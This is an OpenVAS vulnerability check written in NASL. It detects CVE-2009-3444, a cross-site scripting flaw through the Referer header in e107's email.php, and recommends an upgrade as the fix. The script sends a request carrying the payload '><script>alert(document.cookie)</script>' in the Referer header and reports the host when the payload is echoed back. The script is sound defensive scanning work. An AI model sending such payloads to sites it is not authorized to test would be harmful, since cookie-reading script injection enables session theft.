###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_e107_referer_xss_vuln.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# e107 'Referer' Header Cross-Site Scripting Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:e107:e107";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800946");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-10-08 08:22:29 +0200 (Thu, 08 Oct 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2009-3444");
  script_name("e107 'Referer' Header Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("e107_detect.nasl");
  script_mandatory_keys("e107/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://websecurity.com.ua/3528/");
  script_xref(name:"URL", value:"http://www.vulnaware.com/?p=17929");
  script_xref(name:"URL", value:"http://secunia.com/advisories/36832/");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary HTML and script code
  in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"e107 version 0.7.16 and prior.");

  script_tag(name:"insight", value:"The flaw exists due to error in 'email.php' in 'news.1' action. It does not
  properly filter HTML code from user-supplied input in the HTTP 'Referer' header before displaying the input.");

  script_tag(name:"solution", value:"Upgrade to e107 version 0.7.22 or later.");

  script_tag(name:"summary", value:"This host is running e107 and is prone to remote Cross-Site
  Scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://e107.org/edownload.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/email.php?news.1";

host = http_host_name( port:port );

sndReq = string( 'GET ', url, ' HTTP/1.1\r\n',
                 'Host: ', host, '\r\n',
                 'Referer: ><script>alert(document.cookie)</script>\r\n',
                 '\r\n');
rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

if( rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );